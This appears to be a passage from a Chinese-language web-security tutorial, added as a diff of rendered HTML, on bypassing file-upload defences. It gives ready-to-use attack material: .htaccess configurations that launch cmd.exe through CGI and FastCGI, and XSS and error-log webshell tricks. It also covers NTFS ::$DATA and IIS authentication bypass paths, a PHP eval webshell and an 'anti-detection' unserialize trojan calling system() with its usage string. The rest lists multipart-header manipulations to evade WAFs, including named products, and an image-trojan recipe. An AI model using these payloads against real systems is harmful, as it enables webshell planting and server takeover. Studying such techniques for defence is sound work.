+<li>
+<p>命令执行</p>
+<blockquote>
+<p>CGI启动</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cgi_module 需要加载，即 apache 配置文件中有
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">LoadModule cgi_module modules/mod_cgi.so
+</span></span><span class="line"><span class="cl">.htaccess内容
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Options ExecCGI #允许CGI执行
+</span></span><span class="line"><span class="cl">AddHandler cgi-script .xx #将xx后缀名的文件，当做CGI程序进行解析
+</span></span><span class="line"><span class="cl">ce.xx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#!C:/Windows/System32/cmd.exe /k start calc.exe
+</span></span><span class="line"><span class="cl">6</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接访问ce.xx</p>
+<blockquote>
+<p>FastCGI启动</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mod_fcgid.so需要被加载。即 apache 配置文件中有
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">LoadModule fcgid_module modules/mod_fcgid.so
+</span></span><span class="line"><span class="cl">.htaccess
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Options +ExecCGI
+</span></span><span class="line"><span class="cl">AddHandler fcgid-script .xx
+</span></span><span class="line"><span class="cl">FcgidWrapper &#34;C:/Windows/System32/cmd.exe /k start calc.exe&#34; .xx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ce.xx 内容随意</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接访问ce.xx</p>
+</li>
+<li>
+<p>XSS</p>
+<blockquote>
+<p>highlight_file</p>
+</blockquote>
+<p>.htaccess内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value highlight.comment &#39;&#34;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">index.php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">highlight_file(__FILE__);
+</span></span><span class="line"><span class="cl">// comment</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>highlight_file(__FILE__)</code>也可以换作</p>
+<p>错误消息链接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">index.php ：
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">include(&#39;foo&#39;);#foo报错
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">.htaccess
+</span></span><span class="line"><span class="cl">php_flag display_errors 1
+</span></span><span class="line"><span class="cl">php_flag html_errors 1
+</span></span><span class="line"><span class="cl">php_value docref_root &#34;&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>自定义错误文件</p>
+<p>error.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php include(&#39;shell&#39;);#报错页面</span></span></code></pre></td></tr></table>
+</div>
+</div><p>.htaccess</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php_value error_log /tmp/www/html/shell.php 
+</span></span><span class="line"><span class="cl">php_value include_path &#34;&lt;?php phpinfo(); __halt_compiler();&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问 error.php，会报错并记录在 shell.php 文件中</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>.user.ini</code></p>
+</li>
+<li>
+<p>后缀大小写绕过</p>
+</li>
+<li>
+<p>空格绕过</p>
+</li>
+<li>
+<p>点绕过</p>
+</li>
+<li>
+<p>::$DATA绕过</p>
+<ul>
+<li>
+<p>原理</p>
+<p>当我们对一个在NTFS分区中的ASP文件发出包含DATA请 求 ，IIS会 检 查 最 后 一 个 “ . ” 后 面 的 扩 展 名 ， 因 为 多 了 : : DATA请求，IIS会检查最后一个“ . ”后面的扩展名，因为多了::DATA请求，IIS会检查最后一个“.”后面的扩展名，因为多了::DATA，结果IIS不认为这是一个ASP文件，而文件系统可以识别该请求，于是返回ASP的源代码。</p>
+</li>
+<li>
+<p>绕过方法 · IIS目录访问权限绕过</p>
+<p>在IIS6.0+PHP、IIS7+asp、IIS7.5+php的环境下，如果目录是通过HTTP Basic来认证，假设网站根目录存在index.php文件，可通过构造如下方式来绕过认证直接访问目录下的文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/admin::$INDEX_ALLOCATION/index.php
+</span></span><span class="line"><span class="cl">/admin:$i30:$INDEX_ALLOCATION/index.asp</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>绕过方法 · 上传绕过黑名单</p>
+<p>在测试中我们发现如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析</p>
+<table>
+  <thead>
+      <tr>
+          <th>上传的文件名</th>
+          <th>服务器表面现象</th>
+          <th>生成的文件内容</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Test.php:a.jpg</td>
+          <td>生成 Test.php</td>
+          <td>空</td>
+      </tr>
+      <tr>
+          <td>Test.php::$DATA</td>
+          <td>生成 test.php</td>
+          <td><code>&lt;?php phpinfo();?&gt;</code></td>
+      </tr>
+      <tr>
+          <td>Test.php::$INDEX_ALLOCATION</td>
+          <td>生成 test.php 文件夹</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Test.php::$DATA\0.jpg</td>
+          <td>生成 0.jpg</td>
+          <td><code>&lt;?php phpinfo();?&gt;</code></td>
+      </tr>
+      <tr>
+          <td>Test.php::$DATA\aaa.jpg</td>
+          <td>生成 aaa.jpg</td>
+          <td><code>&lt;?php phpinfo();?&gt;</code></td>
+      </tr>
+  </tbody>
+</table>
+</li>
+</ul>
+</li>
+<li>
+<p>配合解析漏洞</p>
+</li>
+<li>
+<p>双后缀名绕过</p>
+</li>
+</ul>
+<h4 id="白名单" class="heading-element"><span>白名单</span>
+  <a href="#%e7%99%bd%e5%90%8d%e5%8d%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>
+<p>MIME绕过</p>
+</li>
+<li>
+<p><code>%00</code>截断</p>
+<ul>
+<li>
+<p>原理</p>
+<p>在上传的时候，当文件系统读到<code>0x00</code>时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生<code>0x00</code>、<code>%00</code>上传截断漏洞</p>
+</li>
+<li>
+<p>绕过方法</p>
+<p>通过抓包截断将<code>evil.php.jpg</code>后面的一个<code>.</code>换成<code>0x00</code>。在上传的时候，当文件系统读到<code>0x00</code>时，会认为文件已经结束，从而将<code>evil.php.jpg</code>的内容写入到<code>evil.php</code>中，从而达到攻击的目的。</p>
+</li>
+</ul>
+</li>
+<li>
+<p><code>move_uploaded_file()</code></p>
+<p>可以通过 <code>move_uploaded_file</code> 函数把自己写的<code>.htaccess</code> 文件上传，覆盖掉服务器上的文件，来定义文件类型和执行权限如果做到了这一点，将获得相当大的权限</p>
+</li>
+</ul>
+<h3 id="服务端--检查内容" class="heading-element"><span>服务端 · 检查内容</span>
+  <a href="#%e6%9c%8d%e5%8a%a1%e7%ab%af--%e6%a3%80%e6%9f%a5%e5%86%85%e5%ae%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="检查文件头" class="heading-element"><span>检查文件头</span>
+  <a href="#%e6%a3%80%e6%9f%a5%e6%96%87%e4%bb%b6%e5%a4%b4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>
+<p>常见文件头</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">格式</th>
+          <th style="text-align: center">文件头</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">TIFF (tif)</td>
+          <td style="text-align: center">49492A00</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Windows Bitmap (bmp)</td>
+          <td style="text-align: center">BM</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">CAD (dwg)</td>
+          <td style="text-align: center">41433130</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Adobe Photoshop (psd)</td>
+          <td style="text-align: center">38425053</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">JPEG (jpg)</td>
+          <td style="text-align: center">FFD8FF</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">PNG (png)</td>
+          <td style="text-align: center">89504E47</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">GIF (gif)</td>
+          <td style="text-align: center">47494638(GIF8)</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">XML (xml)</td>
+          <td style="text-align: center">3C3F786D6C</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">HTML (html)</td>
+          <td style="text-align: center">68746D6C3E</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MS Word/Excel (xls.or.doc)</td>
+          <td style="text-align: center">D0CF11E0</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">MS Access (mdb)</td>
+          <td style="text-align: center">5374616E64617264204A</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">ZIP Archive (zip)</td>
+          <td style="text-align: center">504B0304</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">RAR Archive (rar)</td>
+          <td style="text-align: center">52617221</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Wave (wav)</td>
+          <td style="text-align: center">57415645</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">AVI (avi)</td>
+          <td style="text-align: center">41564920</td>
+      </tr>
+      <tr>
+          <td style="text-align: center">Adobe Acrobat (pdf)</td>
+          <td style="text-align: center">255044462D312E</td>
+      </tr>
+  </tbody>
+</table>
+</li>
+<li>
+<p>绕过</p>
+<p>给上传<strong>脚本加上相应的幻数头字节就可以</strong>，php引擎会将 &lt;?之前的内容当作html文本，不解释而跳过之，后面的代码仍然能够得到执行。</p>
+<blockquote>
+<p>一般不限制图片文件格式的时候使用GIF的头比较方便，因为全都是文本可打印字符</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="检查文件内容" class="heading-element"><span>检查文件内容</span>
+  <a href="#%e6%a3%80%e6%9f%a5%e6%96%87%e4%bb%b6%e5%86%85%e5%ae%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><ul>
+<li>
+<p><code>&lt;?php ?&gt;</code>被过滤</p>
+<ul>
+<li>
+<p>script标签</p>
+<blockquote>
+<p>php&lt;7</p>
+</blockquote>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script language=&#34;php&#34;&gt;
+</span></span><span class="line"><span class="cl"> eval($_POST[2333]);
+</span></span><span class="line"><span class="cl">&lt;/script&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li><code>&lt;?= ?&gt;</code>里面的命令用 php命令的单引号包含</li>
+</ul>
+</li>
+<li>
+<p>只检测敏感内容，不检测php标签，下面是免杀木马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">if (isset($_POST[&#39;run&#39;])) {
+</span></span><span class="line"><span class="cl">  class HandShip {
+</span></span><span class="line"><span class="cl">     public $name;
+</span></span><span class="line"><span class="cl">     public $male;
+</span></span><span class="line"><span class="cl">     function __destruct() {
+</span></span><span class="line"><span class="cl">        $allin = $this-&gt;name;
+</span></span><span class="line"><span class="cl">        $allin($this-&gt;male);
+</span></span><span class="line"><span class="cl">     }
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">if(md5($_POST[&#39;code&#39;])==&#39;ce61649168c4550c2f7acab92354dc6e&#39;){
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  unserialize($_POST[&#39;run&#39;]);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">?&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>用法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">run=O:8:&#34;HandShip&#34;:2:{s:4:&#34;name&#34;;s:6:&#34;system&#34;;s:4:&#34;male&#34;;s:9:&#34;cat /home&#34;;};&amp;code=panda</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>对文件的内容，数据。数据包进行处理</p>
+<p>关键点：<code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ian.php&quot;</code></p>
+<p>将<code>form-data;</code> 修改为<code>~form-data;</code></p>
+</li>
+<li>
+<p>通过替换大小写来进行绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;yjh.php&#34;
+</span></span><span class="line"><span class="cl">content-Type: application/octet-stream</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">content-Disposition: Form-data; name=&#34;file&#34;; filename=&#34;yjh.php&#34;
+</span></span><span class="line"><span class="cl">Content-Type: application/octet-stream</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>通过删减空格来进行绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;yjh.php&#34;
+</span></span><span class="line"><span class="cl">Content-Type: application/octet-stream</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>Content-Disposition: form-data</code>冒号后增加或减少一个空格</p>
+<p><code>form-data; name=&quot;file&quot;;</code> 分号后面增加或减少一个空格</p>
+<p><code>Content-Type: application/octet-stream</code>冒号后面 增加一个空格</p>
+</li>
+<li>
+<p>通过字符串拼接绕过</p>
+<p>看<code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh3.php&quot;</code>
+将<code>form-data</code> 修改为 <code>f+orm-data</code>
+将<code>from-data</code> 修改为 <code>form-d+ata</code></p>
+</li>
+<li>
+<p>双文件上传绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;form action=&#34;https://www.xxx.com/xxx.asp(php)&#34; method=&#34;post&#34;
+</span></span><span class="line"><span class="cl">name=&#34;form1&#34; enctype=&#34;multipart/form‐data&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;FileName1&#34; type=&#34;FILE&#34; class=&#34;tx1&#34; size=&#34;40&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input name=&#34;FileName2&#34; type=&#34;FILE&#34; class=&#34;tx1&#34; size=&#34;40&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;input type=&#34;submit&#34; name=&#34;Submit&#34; value=&#34;上传&#34;&gt;
+</span></span><span class="line"><span class="cl">&lt;/form&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>HTTP header 属性值绕过</p>
+<p><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</code>
+我们通过替换<code>form-data</code> 为<code>*</code>来绕过
+<code>Content-Disposition: *; name=&quot;file&quot;; filename=&quot;yjh.php&quot;</code></p>
+</li>
+<li>
+<p>HTTP header 属性名称绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;085733uykwusqcs8vw8wky.png&#34;
+</span></span><span class="line"><span class="cl">Content-Type: image/png</span></span></code></pre></td></tr></table>
+</div>
+</div><p>绕过内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;085733uykwusqcs8vw8wky.png&#34;
+</span></span><span class="line"><span class="cl">Content-Type: image/png</span></span></code></pre></td></tr></table>
+</div>
+</div><p>删除掉<code>ontent-Type: image/png</code>只留下<code>c</code>，将<code>.php</code>加<code>c</code>后面即可，但是要注意额，双引号要跟着<code>c.php&quot;</code></p>
+</li>
+<li>
+<p>等效替换绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary=---------------------------471463142114		// 原
+</span></span><span class="line"><span class="cl">Content-Type: multipart/form-data; boundary =---------------------------471463142114	// 修改</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>boundary</code>后面加入空格。</p>
+</li>
+<li>
+<p>修改编码绕过</p>
+<p>使用<code>UTF-16</code>、<code>Unicode</code>、<code>双URL编码</code>等等</p>
+</li>
+<li>
+<p>WTS-WAF 绕过上传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;up_picture&#34;; filename=&#34;xss.php&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>添加回车</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: form-data; name=&#34;up_picture&#34;; filename=&#34;xss.php&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>百度云上传绕过</p>
+<p>在对文件名大小写上面没有检测php是过了的，Php就能过，或者PHP，一句话自己合成图片马用Xise连接即可。
+<code>Content-Disposition: form-data; name=&quot;up_picture&quot;; filename=&quot;xss.jpg .Php&quot;</code></p>
+</li>
+<li>
+<p>填充垃圾数据，造成溢出后使WAF崩掉</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Disposition: 字段溢出即可 比如Content-Disposition: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA一直加就行了十万++</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h4 id="getimagesize" class="heading-element"><span>getimagesize()</span>
+  <a href="#getimagesize" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>制作图片马</p>
+<p>准备两个文件：一个是png，一个是php一句话木马</p>
+<p>windows环境下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">copy a.png /b + a.php /a 3.php </span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>/b</code>: 指定以二进制格式复制、合并文件，用于图像或者声音类文件</p>
+<p><code>/a</code>: 指定以ascii格式复制、合并文件用于txt等文本类文件</p>
+<p>输出一个php文件，得到图片🐎</p>
+<h3 id="服务端--条件竞争" class="heading-element"><span>服务端 · 条件竞争</span>
+  <a href="#%e6%9c%8d%e5%8a%a1%e7%ab%af--%e6%9d%a1%e4%bb%b6%e7%ab%9e%e4%ba%89" class="heading-mark">
